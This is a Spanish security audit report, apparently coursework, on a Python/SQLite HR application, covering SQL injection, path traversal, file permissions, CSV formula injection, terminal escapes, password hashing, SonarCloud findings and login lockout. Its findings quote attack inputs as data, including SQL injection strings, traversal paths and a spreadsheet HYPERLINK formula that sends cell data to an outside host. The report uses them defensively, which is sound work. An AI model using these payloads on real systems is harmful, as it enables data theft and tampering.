# Auditoría de seguridad — EcoTech Solutions

**Caso EcoTech Solutions · Evaluación Sumativa 2, Unidades 2 y 3 · TI3V21**
**Alcance:** `ecotech.py`, `main.py` y, desde la pasada 6, `servicios.py`

| Pasada | Fecha | Foco |
|---|---|---|
| 1 | 11-sep-2026 | encapsulamiento, control de entradas, inyección SQL, path traversal |
| 2 | 12-sep-2026 | permisos del archivo, salida a contextos que interpretan datos, hash de claves, autenticación |
| 3 | 12-sep-2026 | integridad de la persistencia: la relación Departamento ↔ Empleado |
| 4 | 15-sep-2026 | revisión de entradas y del código aportado por un compañero |
| 5 | 15-sep-2026 | análisis de SonarCloud sobre el repositorio de GitHub (§2.10) |
| 6 | 21-sep-2026 | **Unidad 3**: inicio de sesión, fuerza bruta, consumo de APIs, errores de red y mensajes de error (§2.11) |
| 7 | 23-sep-2026 | contra la rúbrica (matriz interna del equipo): proyectos y horas persistidos, vínculo Usuario → Empleado, permiso `tiempo`, robustez del login y demora medida (§2.12) |
| 8 | 23-sep-2026 | **integral de cierre** con el Método Auditoría del vault, el bloque 5 del docente y un agente independiente: 20 hallazgos, 4 Medios abiertos (§2.13) |

**Método:** ejecutar ataques concretos contra el código, no leerlo y opinar. Cada hallazgo trae su
reproducción y se puede repetir delante del docente.

Evalúan esto sobre todo los indicadores **2.1.2** (encapsulamiento), **2.1.3** (persistencia) y
**2.1.4** (validación y control de errores), y desde la pasada 6 los **3.1.2** (autenticación y
información sensible) y **3.1.3** (errores de red y códigos HTTP).

---

## Resumen

| # | Hallazgo | Pasada | Gravedad | Estado |
|---|---|---|---|---|
| — | Inyección SQL | 1 | — | **Sin hallazgos** |
| — | Path traversal en la exportación | 1 | — | **Sin hallazgos** |
| — | XSS y cabeceras HTTP | 2 | — | **No aplican** (§1.3) |
| 2.1 | El menú se caía con un entero grande | 1 | Grave | **Corregido** |
| 2.2 | La autorización tenía un solo control real | 1 | Grave | **Corregido** |
| 2.3 | La base quedaba legible por todo el equipo | 2 | Grave | **Corregido** |
| 2.4 | Inyección de fórmulas en el CSV exportado | 2 | Grave | **Corregido** |
| 2.5 | Textos con escapes de terminal y caracteres invisibles | 2 y 4 | Media | **Corregido** |
| 2.6 | Hash de claves con costo bajo y sin sus parámetros | 2 | Media | **Corregido** |
| 2.7 | Clave literal en el código fuente | 2 | Media | **Corregido** |
| 2.8 | La relación Departamento ↔ Empleado vivía en dos lugares | 3 | Alta | **Corregido** |
| 2.9 | Limpieza de pantalla con `os.system` | 4 | Baja | **Corregido** |
| 2.10 | SonarCloud: carácter bidireccional, regex super-lineal, complejidad y 13 más | 5 | Media | **Corregido** (uno anotado para la Unidad 3) |
| 2.11 | Unidad 3: sin autenticación, permisos tardíos, mensajes que filtraban detalle, datos de la red sin validar | 6 | Grave | **Corregido** |
| 2.12 | El login moría con un hash corrupto; proyectos y horas solo en memoria; el EMPLEADO administraba proyectos; dos mensajes con la ruta del archivo | 7 | Grave | **Corregido** |
| 2.13 | Integral de cierre: sesión que no caduca en la pausa, clima sin rango, contacto visible para todos, dependencias con avisos, y 16 más | 8 | Media | **Los 4 Medios y 4 Bajos corregidos**; 5 Bajos abiertos |
| 3.1 | `actualizar_contacto` no pide permiso | 1 y 6 | Decisión | **Cerrado en el menú** (pasada 6) |
| 3.2 | `Empleado._proyectos` modificable desde fuera | 1 | Observación | **Resuelto** en la pasada 7: la lista ya no existe |
| 3.3 | Datos de contacto en el resumen exportable | 1 | Observación | Se declara |
| 3.4 | No existe autenticación | 2 y 6 | Grave | **Corregido** en la Unidad 3 (§2.11) |
| 3.5 | Defectos latentes en `Usuario` | 2 | Observación | Parcial |

---

## 1. Lo que salió limpio

### 1.1 Inyección SQL

Todos los `execute()` pasan los valores como parámetros `?`. Se probaron cargas reales:

| Carga inyectada | Por dónde entró | Resultado |
|---|---|---|
| `Legal'); DROP TABLE empleado; --` | nombre de departamento | guardado como texto; la tabla `empleado` intacta |
| `x'; DELETE FROM empleado WHERE '1'='1` | `Departamento.renombrar` | guardado como texto; los empleados intactos |
| `1 OR 1=1` | `Empleado.buscar(id)` | devuelve `None`: ninguna fila coincide |

**Por qué funciona:**
- El valor viaja por un canal distinto al de la consulta, así que el motor nunca lo analiza como SQL.
- `Connection.execute` ejecuta **una sola** sentencia: un `;` inyectado no encadenaría nada.
- La única interpolación en SQL es `{cls.COLUMNAS}`, una constante escrita por nosotros. Va así
  porque `?` sustituye valores, no nombres de columnas.

### 1.2 Path traversal en la exportación

`Informe.exportar` **resuelve la ruta y recién entonces** comprueba que siga dentro de la carpeta de
trabajo. Comprobar antes de resolver no sirve, porque resolver es lo que colapsa los `..`.

| Ruta pedida | Resultado |
|---|---|
| `../../fuga.csv` | bloqueado |
| `/tmp/fuga.csv` | bloqueado |
| `salida.csv` | permitido |

### 1.3 Por qué no hay XSS ni cabeceras que revisar

- **XSS** requiere un navegador que interprete HTML. Aquí la salida es `print()` a una terminal.
- **Cabeceras de seguridad** (`Content-Security-Policy` y compañía) son de respuestas HTTP, y no hay
  HTTP.

Pero el problema de fondo del XSS, **un dato no confiable entregado a algo que lo interpreta**, sí
existe aquí, en dos lugares:

| Contexto que interpreta | Qué se inyecta | Hallazgo |
|---|---|---|
| Navegador | HTML y JavaScript | no aplica |
| Planilla, al abrir el CSV | fórmulas | 2.4 |
| Terminal, al listar | secuencias de escape y caracteres invisibles | 2.5 |

---

## 2. Hallazgos corregidos

### 2.1 El menú se caía con un entero grande · Grave

**Qué pasaba.** Un entero de 25 dígitos pasaba la validación y reventaba al llegar a SQLite con
`OverflowError: Python int too large to convert to SQLite INTEGER`, que **no estaba en ningún
`except`**. El programa moría con traceback. Se reproducía por seis caminos del menú: los ids de
departamento y de empleado, y el salario. Rompía el indicador 2.1.4.G.7 justo en lo que evalúa:
evitar que el sistema se interrumpa.

**Cómo se corrigió.** Las seis rutas cruzaban por un solo punto, así que la corrección va ahí, en
tres capas:

| Capa | Dónde | Qué rechaza |
|---|---|---|
| Formato | `main.py`, `pedir_entero()` | lo no decimal, más de 20 dígitos y lo que pase de `MAXIMO_ENTERO` (mil millones); vuelve a preguntar |
| Regla de negocio | `Empleado.__init__` | salario fuera de `1 … SALARIO_MAXIMO` (cien millones); lanza `ValueError` |
| Base de datos | `ESQUEMA` | `CHECK (salario > 0 AND salario <= 100000000)` |

La segunda capa existe porque `pedir_entero` se salta llamando a la clase desde otro programa; la
tercera, porque el objeto se salta abriendo la base con otra herramienta. Y `main.py` cerró la cadena
con un `except Exception` **último**, que nombra el tipo del error y continúa (no es `except: pass`).

**Dos detalles del mismo frente:**
- `isdigit()` se cambió por **`isdecimal()`**: `"²".isdigit()` es `True` pero `int("²")` falla.
- *(Pasada 4)* Con más de 4300 dígitos, `int()` lanza un `ValueError` en inglés. Por eso el largo se
  mira **antes** de convertir. Se usa 20 y no 10 para aceptar ceros a la izquierda.

**Evidencia:**
```
Salario: 9999999999999999999999999
   ! Demasiado grande. El máximo es 1000000000.
Salario: 500000000
   ! Salario fuera de rango (1 a 100000000): 500000000
Salario: 1720000
   Empleado contratado con id 4.
```

### 2.2 La autorización tenía un solo control real · Grave

**Qué pasaba.** `Usuario._PERMISOS` declara cuatro módulos, pero `tiene_permiso()` solo se llamaba al
leer el salario y al generar un informe. Con un usuario de rol `EMPLEADO`:

| Operación | Antes | Después |
|---|---|---|
| Leer el salario | bloqueado | bloqueado |
| Crear, renombrar o borrar un departamento | **permitido** | bloqueado |
| Borrar un empleado | **permitido** | bloqueado |

**El sistema protegía un sueldo y regalaba el borrado.** Encapsular un atributo no sirve si
cualquiera puede eliminar el registro entero.

**Cómo se corrigió.** La comprobación se extrajo a una sola función, `autorizar()`, que **lanza en vez
de devolver un booleano** (nadie puede olvidar mirar el resultado) y actúa **antes** de tocar la
base. Hoy son **nueve** las operaciones protegidas, y el módulo sale de la tabla que se escribe:

| Módulo | Métodos |
|---|---|
| `departamentos` | `Departamento.guardar`, `renombrar`, `eliminar`, `asignar_gerente` |
| `empleados` | `Empleado.obtener_salario`, `Empleado.eliminar`, `Departamento.agregar_empleado`, `quitar_empleado` |
| `informes` | `Informe.generar` |

`Empleado.guardar` también queda protegido, porque insertar exige leer el salario. Los roles pasaron
a significar algo: un `GERENTE` administra departamentos pero no borra empleados; un `EMPLEADO` no
escribe nada. **Evidencia:** la autoverificación intenta siete escrituras sin permiso, las siete
fallan y la base queda intacta.

### 2.3 La base quedaba legible por todo el equipo · Grave

**Qué pasaba.** SQLite crea el archivo con los permisos por omisión del equipo (`0644`/`0664`):
cualquier usuario de la máquina podía leer `ecotech.db`, y adentro están los sueldos. Era la puerta
de atrás del encapsulamiento: `__salario` protege el dato dentro del programa, no el archivo.

**Cómo se corrigió.** `crear_tablas()` deja el archivo en **`0600`**. Va ahí porque es el único punto
por el que la base nace y el menú lo llama en cada arranque, así que también corrige una base que ya
existiera. El `chmod` atrapa `OSError` y avisa en vez de propagar: el `except` de arranque de
`main.py` es `sqlite3.Error`, y un `OSError` sin atrapar mataría el programa.

**Evidencia:** `ls -l ecotech.db` → `-rw-------`, y un `assert` de la autoverificación lo comprueba.

### 2.4 Inyección de fórmulas en el CSV exportado · Grave

**Qué pasaba.** Una planilla evalúa como fórmula toda celda que empieza con `=`, `+`, `-` o `@`. Un
empleado registrado como `=HYPERLINK("http://sitio.cl?d="&A1,"Ver")` filtraría datos al abrir el
informe. `csv.writer` **no** protege de esto: escapa lo que rompe el formato del archivo (comas y
comillas), no lo que la planilla interpreta después.

**Cómo se corrigió.** `sin_formula()` antepone un apóstrofo a las celdas que empiezan con `= + - @ \t
\r`, y `exportar()` la aplica a cada celda. **Va en la salida y no al guardar**, igual que el HTML se
escapa al imprimir: un apellido puede empezar con guion, y el problema no es el dato sino quien lo
interpreta.

**Evidencia:** la autoverificación exporta `["=1+1", "@SUM(A1:A9)", "Juanita Bravo"]` y comprueba
`'=1+1`, `'@SUM(A1:A9)` y `Juanita Bravo` **intacta**. Una defensa que altera datos inofensivos
corrompe el informe.

### 2.5 Textos con escapes de terminal y caracteres invisibles · Media

**Qué pasaba.** El menú vuelve a imprimir los textos al listar.
- *(Pasada 2)* Un departamento llamado `Legal\x1b[2J` **borraba la pantalla** de quien listaba, y con
  `\x1b[1A` se podía sobrescribir la línea de arriba y mentir sobre lo que hay en la base. El correo
  pasaba igual: `\x1b` no es `\s`, así que la regex no lo excluía.
- *(Pasada 4)* El filtro de la pasada 2 miraba solo los códigos menores a 32 y el 127, y dejaba pasar
  **caracteres de control C1 y marcas invisibles** como U+202E, que hace que un nombre **se vea al
  revés**. Además:
  - el correo **no tenía tope de largo**, y su regex tardaba en proporción al cuadrado del largo
    ante una entrada armada para fallar al final;
  - el patrón del teléfono usaba `\d`, que acepta dígitos de cualquier alfabeto (los árabes, U+0660 a
    U+0669).

**Cómo quedó:**

| Dónde | Qué hace |
|---|---|
| `texto()` | rechaza lo **no imprimible** con `isprintable()`. Cubre todo texto obligatorio: nombres, dirección, correo, descripciones y título. Costo: también rechaza el espacio duro (U+00A0) |
| `Persona.__fijar_contacto()` | el correo pasa por `texto(correo, "El correo", 254)` **antes** de la regex |
| `PATRON_CORREO` | regex lineal `[^@\s]+@[^@\s.]+(?:\.[^@\s.]+)+`; los controles ya los rechazó `texto()` (pasada 5, §2.10) |
| `PATRON_TELEFONO` | `\d` con `re.ASCII`: solo dígitos 0-9 (pasada 5, §2.10) |

Se **rechaza** en vez de limpiar, como el resto del archivo: `ValueError` con el campo nombrado.
**Evidencia:** la autoverificación prueba el escape en un nombre y en el correo, un correo de 265
caracteres con formato válido, la marca U+202E y un teléfono con dígitos árabes.

### 2.6 Hash de claves con costo bajo y sin sus parámetros · Media

**Qué pasaba:**
- **El costo era el ejemplo de la documentación**, `n=2**14`. OWASP pide hoy `2**17` como mínimo.
- **El hash no guardaba sus parámetros** (`scrypt$sal$hash`). Subir el costo mañana dejaría sin poder
  verificar todos los hashes de hoy.

**Cómo se corrigió:**
- `Usuario.COSTO = (2**16, 8, 1)`, con `maxmem` explícito, porque el límite por omisión de OpenSSL
  (32 MB) hace fallar a `hashlib.scrypt`.
- Formato `scrypt$n$r$p$sal$hash`: `verificar_clave` lee los parámetros del hash guardado.
- `2**16` y no `2**17`, a propósito: `2**17` son 134 MB y casi un segundo por hash, y la
  autoverificación hace varios. La constante está en un solo lugar.

| Parámetros | Tiempo por hash | Memoria |
|---|---|---|
| `n=2**14` (antes) | 57 ms | 16 MB |
| `n=2**16` (vigente) | 248 ms | 64 MB |

**Se hizo ahora porque era gratis:** nada escribe todavía la tabla `usuario`, así que no había hashes
que migrar.

### 2.7 Clave literal en el código fuente · Media

`main.py` construía el solicitante con la clave `"Clave-RRHH-2026"` escrita en el archivo. Una
credencial en el código viaja al zip y al repositorio, y queda en el historial. Se reemplazó por
`secrets.token_urlsafe(24)` más un sufijo `"aA1!"` que garantiza los tipos de caracteres que exige
`_validar_clave`. Esa clave **no se usa para nada** (sin login solo se llama `tiene_permiso()`), así
que una al azar sirve igual. Los literales de la autoverificación se quedan: ahí son el dato de
prueba.

### 2.8 La relación Departamento ↔ Empleado vivía en dos lugares · Alta

No es seguridad, es **integridad de la persistencia**, que evalúa el criterio 2.1.3.

**El síntoma.** Un departamento con dos empleados en la base, leído de nuevo:
```
resumen          : Departamento: Desarrollo Sostenible | Gerente: sin gerente | Empleados: 0
contar_empleados : 2
```

**La causa, confirmada con experimento.** Había **dos fuentes de verdad que nunca se sincronizaban**:
las listas `__empleados` y `__gerente` de `Departamento`, heredadas de la Unidad 1, y la clave
foránea del CRUD.

| Hallazgo | Estado |
|---|---|
| `agregar_empleado` y `quitar_empleado` no escribían la clave foránea | corregido |
| `asignar_gerente` no escribía `gerente_id` | corregido |
| `listar()` y `buscar()` devolvían departamentos sin empleados ni gerente | corregido |
| `Empleado.asignar_departamento` duplicaba a `agregar_empleado` y no está en el UML | corregido: se borró |
| Una gerente que cambiaba de departamento seguía en el cargo anterior | corregido |
| La base se abría en el directorio de trabajo: lanzar el menú desde otra carpeta mostraba una base vacía | corregido: `RUTA_ACTIVA` junto a `ecotech.py` |
| Todo `IntegrityError` se informaba como «correo ya registrado» | corregido: `sqlite_errorname` distingue el `UNIQUE` |
| Un segundo `guardar()` intentaba otro `INSERT` | corregido: se rechaza con `ValueError` |

**La corrección: se quitó la copia, no se sincronizó.** Con una sola fuente no hay nada que separar.
- Los métodos del UML **escriben y leen la clave foránea**, y `obtener_resumen` cuenta con el mismo
  `COUNT(*)` que el menú.
- Las reglas que cruzan tablas van **en la misma transacción**: mover a una gerente libera el cargo
  anterior en el mismo `with conectar()`, y «el gerente pertenece al departamento» va como `EXISTS`
  dentro del `UPDATE`.
- Los tres métodos que escriben ganaron `solicitante`, en el código y en `modelo_u2.drawio` (hoy en `diagramas/historico/`).
- `exigir_guardado()` rechaza relacionar un objeto sin id; sin eso, `WHERE id = NULL` afecta cero
  filas en silencio.

**Evidencia:** la autoverificación lee la relación con **otra instancia** que la que escribió, y prueba
el gerente ajeno, el cargo vacante al moverse y al borrarse, el departamento sin guardar, el doble
`guardar()` y quitar dos veces.

### 2.9 Limpieza de pantalla con `os.system` · Baja

*(Pasada 4)* Un compañero aportó la pausa y la limpieza de pantalla del menú, escritas con
`os.system("cls" if os.name == "nt" else "clear")`. **`os.system` abre una shell y busca `clear` en el
PATH**: un `clear` falso puesto antes en el PATH se ejecutaría. Analizadores como Bandit lo marcan
(B605, B607). Se reemplazó por la secuencia ANSI `"\033[2J\033[H"`, que es texto y no un proceso.
Límite conocido: la consola antigua de Windows muestra los códigos en vez de borrar.

### 2.10 Análisis de SonarCloud · Media

*(Pasada 5 · 15-sep-2026)*

**Qué es y cómo se leyó.** SonarCloud analiza el repositorio `poo-ecotech` en GitHub cada vez que se
sube código a la rama `main`, y marca problemas de seguridad, confiabilidad y mantenibilidad. Los
issues se leyeron desde su API pública (`api/issues/search`, estados abiertos y confirmados) y los
*security hotspots* desde `api/hotspots/search`, que devolvió cero.

#### Qué encontró: 51 issues abiertos

| Calidad | Issues | Reglas |
|---|---|---|
| **Seguridad** | 3 | S6389 · carácter bidireccional en el código |
| **Confiabilidad** | 3 | S8786 · regex con retroceso super-lineal |
| **Mantenibilidad** | 45 | S1192, S3776, S4487, S5869, S6353, S6659, S1135 |

| Archivo | Issues | Observación |
|---|---|---|
| `ecotech.py` | 11 | los originales del sistema |
| `main.py` | 5 | los originales del menú |
| `comentado/ecotech_corto.py` | 12 | los mismos de `ecotech.py`, más un falso positivo «TODO» |
| `comentado/Comments_Explicacion_Larga/ecotech_largo.py` | 13 | los mismos de `ecotech.py`, más dos falsos positivos «TODO» |
| `comentado/main_corto.py` | 5 | los mismos de `main.py` |
| `comentado/Comments_Explicacion_Larga/main_largo.py` | 5 | los mismos de `main.py` |

**35 de los 51 estaban en los espejos comentados**, que son el mismo código que la raíz con más
comentarios. Por eso cada issue real aparecía tres veces. Además, SonarCloud reportaba **código
duplicado**: tampoco era un defecto, porque los espejos repiten la raíz a propósito. Las dos cosas se
resolvieron **sacando `comentado/` del repositorio** (`git rm -r --cached comentado` y la carpeta en el
`.gitignore`). Los espejos siguen existiendo en la carpeta local como material de estudio para la
defensa.

Quedan **16 issues reales**, todos en `ecotech.py` y `main.py`, más los 3 falsos positivos de los
espejos. Uno por uno:

#### S6389 · Carácter bidireccional en el código · Seguridad, media · 3 issues

**Qué dice la regla.** Un carácter de control bidireccional (U+202A a U+202E, U+2066 a U+2069) pegado
en el código fuente puede hacer que un editor **muestre el código en un orden distinto al que se
ejecuta**. Es el ataque conocido como «Trojan Source» (CVE-2021-42574): una revisión humana lee una
cosa y el intérprete ejecuta otra.

**Qué había.** `ecotech.py:674` y la misma línea en los dos espejos. La prueba «marca bidi» de la
autoverificación tenía el carácter U+202E (RIGHT-TO-LEFT OVERRIDE) **escrito literal** dentro del
texto de prueba, invisible en pantalla:

```python
assert _rechaza(lambda: Departamento("Legal<U+202E invisible>")), "marca bidi"
```

**Diagnóstico: real.** Se confirmó leyendo los bytes del archivo. No había lógica escondida: el
carácter estaba solo dentro de un dato de prueba, justo el que comprueba que `texto()` lo rechaza. Pero
la regla tiene razón: el código fuente no debe contener ese carácter. El escape se había pedido como
`\u202e` y quedó guardado el carácter real.

**Reparación.** El dato de prueba se escribe con el escape de Python, que produce el mismo texto en
ejecución sin que el carácter esté en el archivo. Lo mismo se hizo con los dígitos árabes de la línea
siguiente: no son controles bidireccionales y SonarCloud no los marcaba, pero son del mismo tipo de
problema.

```python
assert _rechaza(lambda: Departamento("Legal\u202e")), "marca bidi"
assert _rechaza(lambda: Empleado("J", calle, "\u0669\u0668\u0667\u0666\u0665\u0664\u0663\u0662\u0661", correo,
                                 contrato, 1000)), "dígitos no ASCII"
```

**Verificación.**
- Un recorrido de todos los `.py` y `.md` buscando U+202A a U+202E, U+2066 a U+2069 y dígitos
  U+0660 a U+0669 no encuentra ninguno.
- La autoverificación sigue en `OK`: la prueba todavía rechaza la marca invisible.

#### S8786 y S5869 · La regex del correo · Confiabilidad media y mantenibilidad · 4 issues

**Qué dicen las reglas.**
- **S8786:** la expresión puede tardar tiempo super-lineal por *backtracking*: con una entrada armada
  para fallar al final, el motor prueba muchísimas combinaciones.
- **S5869:** la clase de caracteres tiene elementos repetidos.

**Qué había** (`ecotech.py:32`):
```python
PATRON_CORREO = re.compile(r"[^@\s\x00-\x1f\x7f]+@[^@\s\x00-\x1f\x7f]+\.[^@\s\x00-\x1f\x7f]+")
```

**Diagnóstico: real, las dos.**
- **Repetidos:** `\s` ya incluye tabulación, salto de línea y otros caracteres que también están en
  `\x00-\x1f`. SonarCloud lo contó una vez por cada una de las tres clases.
- **Super-lineal:** el punto entraba en `[^@…]+` y también en `\.`. Ante `a@....…@`, el motor probaba
  cada posible corte entre los puntos antes de fallar. La auditoría ya había visto este costo en la
  pasada 4 y lo había acotado con el tope de 254 caracteres; SonarCloud confirmó que la regex misma
  debía cambiar.

**Reparación** (`ecotech.py:32`):
```python
PATRON_CORREO = re.compile(r"[^@\s]+@[^@\s.]+(?:\.[^@\s.]+)+")
```
- **Lineal:** el dominio se divide en tramos que no contienen puntos, separados por un punto. No hay
  dos formas de repartir el texto, así que no hay retroceso.
- **Sin repetidos:** la regex ya no excluye controles a mano, porque `Persona.__fijar_contacto()` pasa el
  correo por `texto()` **antes**, y `texto()` rechaza todo lo no imprimible.
- **Además es más estricta:** rechaza dominios con etiquetas vacías (`a@b..cl`).

**Verificación.**
- La autoverificación sigue rechazando el correo sin `@`, el correo con escape de terminal y el de 265
  caracteres.
- La sesión real del menú, con todos los correos de ejemplo, sale idéntica.

#### S6353 · `[0-9]` en vez de `\d` · Mantenibilidad · 1 issue

**Qué había.** `PATRON_TELEFONO = re.compile(r"(\+?56)?[2-9][0-9]{8}")`. Se había escrito `[0-9]` a
propósito en la pasada 4, porque en Python `\d` acepta dígitos de cualquier alfabeto.

**Reparación.** `re.compile(r"(\+?56)?[2-9]\d{8}", re.ASCII)`. Con `re.ASCII`, `\d` significa
exactamente `0-9`: se cumple la regla sin volver a aceptar dígitos árabes. La prueba «dígitos no ASCII»
lo confirma.

#### S4487 · Atributos privados que nunca se leen · Mantenibilidad, crítico · 2 issues

| Atributo | Diagnóstico | Reparación |
|---|---|---|
| `Proyecto.__descripcion` (`ecotech.py:468`) | real: se validaba y guardaba, pero nada lo mostraba | `Proyecto.obtener_resumen()` ahora incluye `Descripción: …` |
| `Usuario.__nombre_usuario` (`ecotech.py:541`) | lo declara el UML (`- nombreUsuario: str`) y se va a leer al guardar y autenticar usuarios, que es de la Unidad 3 | se mantiene, anotado con `# NOSONAR: se lee al guardar y autenticar, Unidad 3`. Quitarlo rompería la correspondencia con el diagrama |

#### S3776 · Complejidad cognitiva · Mantenibilidad, crítico · 2 issues

**Qué dice la regla.** Una función no debería pasar de 15 puntos de complejidad cognitiva, que suma
por cada `if`, `elif`, `except`, bucle y anidamiento.

**Qué había** en `main.py`:
- **`ejecutar()` = 30:** las diez opciones del menú escritas completas dentro de un `if/elif`, con sus
  `if` internos.
- **`main()` = 26:** el bucle, la lectura de la opción, la cadena de 8 `except` y la pausa, todo junto.

**Reparación.** Mismo comportamiento, repartido en funciones chicas:

| Antes | Después |
|---|---|
| todo el código de cada opción dentro de `ejecutar()` | una función por opción: `crear_departamento`, `contratar_empleado`, `renombrar_departamento`, `editar_contacto`, `asignar_a_departamento`, `eliminar_departamento`, `eliminar_empleado` |
| `ejecutar()` con 30 puntos | `ejecutar()` solo despacha: un `if/elif` que llama a esas funciones (~12). Sigue sin diccionario, como decidimos en `ANALISIS_IA.md` fila 20 |
| `main()` con el `try` y los 8 `except` | `atender(opcion, solicitante)` tiene la **misma cadena de 8 `except` en el mismo orden** (`Cancelado` primero, `Exception` al final) |
| la lectura de la opción y la pausa, cada una con su `except` dentro de `main()` | `pedir_opcion()` y `pausar()`, que devuelven si hay que salir |
| `main()` con 26 puntos | `main()`: pedir, atender, pausar y limpiar, con la despedida en un solo lugar |

**Verificación: el menú se comporta exactamente igual.**
- **Sesión real:** las 25 acciones de `SALIDA_TERMINAL.md` sobre una base temporal dan una salida
  idéntica, byte a byte.
- **Casos límite:** se compararon el `main.py` nuevo y el commiteado en siete casos, con salida
  idéntica en todos: fin de entrada al elegir opción, Ctrl+C al elegir opción, fin de entrada a mitad
  de contratar, Ctrl+C a mitad de contratar, fin de entrada en la pausa, opción desconocida, y cancelar
  con `x`.

#### S1192 · Textos repetidos · Mantenibilidad, crítico · 5 issues

| Dónde | Texto repetido | Reparación |
|---|---|---|
| `ecotech.py:660`, autoverificación | `"j@e.cl"` y `"Calle 1"`, 5 veces cada uno | variables locales `calle` y `correo` |
| `main.py:124` | `"Desarrollo Sostenible"`, 3 veces | constantes `DESARROLLO` e `INVESTIGACION`, usadas en `PLANTILLA` y en `sembrar()` |
| `main.py:189` y `:195` | `"   Id del departamento: "` y `"   Id del empleado: "`, 3 veces cada uno | constantes `PIDE_ID_DEPARTAMENTO` y `PIDE_ID_EMPLEADO` |

De paso, el mensaje «Interrumpido. Hasta luego.» pasó a la constante `INTERRUMPIDO`, para que el
refactor no creara una repetición nueva.

#### S6659 · Usar `endswith` · Mantenibilidad · 1 issue

`oct(os.stat(RUTA_ACTIVA).st_mode)[-3:] == "600"` pasó a
`oct(os.stat(RUTA_ACTIVA).st_mode).endswith("600")`. Hace lo mismo y se lee mejor.

#### S1135 · «TODO» · 3 issues, solo en los espejos · falso positivo

SonarCloud buscaba la palabra «TODO» y la encontró en comentarios que **empezaban con «Todo»** en
español («Todo es biblioteca estándar», «Todo el SQL usa `?`»). No eran tareas pendientes. Los
comentarios se reescribieron («Solo biblioteca estándar», «Cada consulta SQL usa `?`»), y además esos
archivos ya no están en el repositorio.

#### Qué debería mostrar el próximo análisis

| Issues | Estado esperado |
|---|---|
| S6389, S8786, S5869, S6353, S6659, S1192 y S3776 en `ecotech.py` y `main.py` | cerrados |
| S4487 de `Proyecto.__descripcion` | cerrado |
| S4487 de `Usuario.__nombre_usuario` | cerrado por `NOSONAR`, con el motivo escrito en la línea |
| los 35 de `comentado/` y la duplicación | desaparecen, porque la carpeta ya no está en el repositorio |

Si algún issue sigue abierto después del push, se revisa aquí mismo antes de marcarlo como aceptado
en SonarCloud.

---

#### Segundo análisis, 23-sep-2026: Quality Gate en rojo

El push de la pasada 7 marcó **C en Seguridad y C en Confiabilidad** sobre el código nuevo (se exige
A). Dos causas, las dos en las autoverificaciones y corregidas el mismo día:

- **S6389 · Seguridad:** `servicios.py` traía un U+202E **literal** en una prueba de entradas, el
  mismo error que se corrigió en `ecotech.py` el 15-sep y que volvió con la Unidad 3. Ahora es el
  escape `\u202e`: la prueba verifica lo mismo sin que el carácter esté escrito en el archivo.
- **S1244 · Confiabilidad, 4 issues:** comparaciones `==` entre decimales (horas consumidas,
  temperatura, tipo de cambio). Pasaron a `math.isclose`: dos decimales que deberían ser iguales
  pueden diferir en el último bit.

Los 10 issues de mantenibilidad restantes se cerraron en el commit siguiente:

| Regla | Issues | Reparación |
|---|---|---|
| S1192 · textos repetidos | 5 (`"c.rojas"`, `"b.soto"` y `"Valparaíso"` en las pruebas; el correo de Ignacio en la siembra) | una variable o constante por texto. De paso, la consulta de prueba que tenía `'c.rojas'` dentro del SQL pasó a `?` |
| S1515 · `lambda` que captura la variable del ciclo | 2 (`servicios.py`) | parámetro por defecto, `lambda c=ciudad: …`. No era un error real (la `lambda` se ejecuta en el mismo ciclo), pero así lo es por construcción |
| S108 · bloque vacío | 1 (`while …: pass` en `main()`) | un bucle con variable, `seguir = usar_sesion(…)` |
| S4487 · atributo privado que nunca se lee | 2 (`Usuario.__intentos_fallidos`, `__bloqueado_hasta`) | **falso positivo**: se leen en `autenticar()` a través de `usuario.__…`, y el analizador solo sigue las lecturas por `self`. Se marcan `# NOSONAR` con la razón, como el precedente del 15-sep |

### 2.11 Unidad 3: autenticación, APIs y errores de red · Grave

Sexta pasada, 21-sep-2026. Cierra el hallazgo más grave que quedaba abierto (§3.4) y revisa la
superficie nueva: la red. Las decisiones sobre el código que propuso la IA están en
`ANALISIS_IA.md`, filas 26 a 43.

#### Inicio de sesión y fuerza bruta — el diseño de §3.4, implementado

| Amenaza | Defensa | Dónde |
|---|---|---|
| Entrar sin cuenta | El menú no existe sin `Usuario.autenticar()`; el `solicitante` es el usuario autenticado, no uno construido en el código | `main.iniciar_sesion` |
| Clave en claro | `scrypt` con sal por cuenta, costo `2**16`, comparación en tiempo constante; en la base solo queda `scrypt$n$r$p$sal$hash`. La clave se teclea con `getpass`, sin eco | `Usuario._hashear`, `verificar_clave` |
| Adivinar la clave | 5 fallos seguidos bloquean la cuenta **5 minutos**, persistido en la base (`intentos_fallidos`, `bloqueado_hasta`): reiniciar el programa no lo levanta. Durante el bloqueo, **ni la clave correcta entra** | `Usuario.autenticar` |
| Descubrir qué cuentas existen | Mismo mensaje para clave mala, cuenta inexistente y cuenta bloqueada, y **misma demora**: si el usuario no existe se calcula igual un scrypt señuelo | `Usuario.autenticar` |
| Credenciales vacías o malformadas | Se rechazan antes de consultar la base; el nombre pasa por `PATRON_USUARIO` y viaja con `?` | `main.iniciar_sesion`, `Usuario.buscar_por_nombre` |
| Crear un administrador sin sesión | Sin solicitante solo entra **la primera cuenta**, como `ADMIN_RRHH`, con una sola sentencia `INSERT … WHERE NOT EXISTS`: no hay ventana entre comprobar y escribir | `Usuario.guardar` |
| Sesión olvidada abierta | Tras **10 minutos** sin actividad, la siguiente opción cierra la sesión y pide credenciales | `main.usar_sesion` |

Reproducción: `python3 ecotech.py` prueba todo lo anterior con `assert`, incluida una inyección
`c.rojas' OR '1'='1` en el nombre y el sexto intento con la clave correcta.

#### Control de acceso: antes de pedir datos, no después

Con roles reales apareció un defecto que con el administrador fijo de la U2 no se veía: los métodos
revisaban el permiso **al escribir**. Un gerente llenaba los seis datos de «contratar» para recibir
«No autorizado», y «Datos de ejemplo» creaba los departamentos antes de fallar en los empleados,
dejando una carga a medias. Ahora `ejecutar()` consulta el mapa `PERMISO` **antes de pedir el primer
dato**, y los métodos lo vuelven a revisar al escribir. Eso cierra también §3.1: la opción 7 exige
el módulo `empleados`, sin tocar la firma que fija el UML.

| Rol | Puede | No puede |
|---|---|---|
| `ADMIN_RRHH` | todo, incluido crear usuarios, ver la planilla de un proyecto y registrar horas a nombre de cualquiera | — |
| `GERENTE` | leer; departamentos; crear, asignar y eliminar proyectos; clima del proyecto; informe de dotación; registrar **sus** horas si su cuenta está vinculada | contratar, asignar, editar o eliminar empleados, ver sueldos, planilla, crear usuarios |
| `EMPLEADO` | leer y registrar **sus propias** horas en proyectos donde participa | administrar proyectos, consultar el clima, informes, planilla, crear usuarios |

